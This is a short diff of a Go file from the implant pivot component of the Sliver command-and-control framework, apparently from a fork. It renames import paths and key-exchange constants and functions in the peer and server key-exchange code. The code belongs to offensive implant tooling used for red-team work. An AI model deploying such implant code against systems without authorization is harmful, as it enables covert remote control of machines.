@@ -31,10 +31,10 @@ import (
 	"log"
 	// {{end}}
 
-	consts "github.com/starkzarn/glod/implant/sliver/constants"
-	"github.com/starkzarn/glod/implant/sliver/cryptography"
-	"github.com/starkzarn/glod/implant/sliver/pivots"
-	pb "github.com/starkzarn/glod/protobuf/sliverpb"
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/pivots"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 )
@@ -73,9 +73,9 @@ func (p *NetConnPivotClient) KeyExchange() error {
 
 func (p *NetConnPivotClient) peerKeyExchange() error {
 	pivotHello, _ := proto.Marshal(&pb.PivotHello{
-		PublicKey:          []byte(cryptography.PeerAgePublicKey),
+		PublicKey:          []byte(cryptography.ECCPublicKey),
 		PeerID:             pivots.MyPeerID,
-		PublicKeySignature: cryptography.PeerAgePublicKeySignature,
+		PublicKeySignature: cryptography.ECCPublicKeySignature,
 	})
 
 	// Enforce deadlines on the key exchange
@@ -114,7 +114,7 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 }
 
 func (p *NetConnPivotClient) serverKeyExchange() error {
-	serverSessionKey := cryptography.RandomSymmetricKey()
+	serverSessionKey := cryptography.RandomKey()
 	p.serverCipherCtx = cryptography.NewCipherContext(serverSessionKey)
 	ciphertext, err := cryptography.AgeKeyExToServer(serverSessionKey[:])
 	if err != nil {
